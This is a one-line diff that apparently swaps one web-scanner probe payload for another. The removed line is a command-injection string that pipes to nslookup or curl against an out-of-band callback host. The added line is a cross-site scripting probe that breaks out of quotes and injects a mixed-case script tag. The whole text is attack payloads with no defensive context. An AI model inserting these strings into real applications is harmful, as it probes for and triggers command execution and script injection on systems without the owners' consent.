@@ -1,1 +1,1 @@
-|(nslookup -q=cname hitwqjnwjncyh1e755.bxss.me||curl hitwqjnwjncyh1e755.bxss.me)
+555'"()&%<zzz><ScRiPt >d144(9779)</ScRiPt>
